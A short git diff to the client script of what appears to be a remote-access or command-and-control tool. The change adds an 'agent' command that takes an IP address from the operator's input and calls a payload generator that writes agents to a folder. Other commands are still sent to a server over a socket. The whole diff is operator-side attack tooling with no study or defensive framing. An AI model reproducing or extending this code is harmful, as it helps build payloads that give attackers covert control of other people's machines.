@@ -6,8 +6,10 @@ import clipboard
 import socket
 import pickle
 import codecs
-
+import re as r
 import os
+
+import generator
 
 
 # Client Side 
@@ -34,7 +36,12 @@ while True:
         exit(0)
     elif msg == 'clear':
         os.system('clear')
+    elif msg[:5] == 'agent':
+        serv_ip = r.search('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', msg)
+        generator.generate_agent(serv_ip.group(0))
+        rprint("Payload Generated at [bold green]../agents/")
     elif msg != '':
+        print(msg[5:])
         sock.send(msg.encode())
 
         # Special case with object being returned instead of string
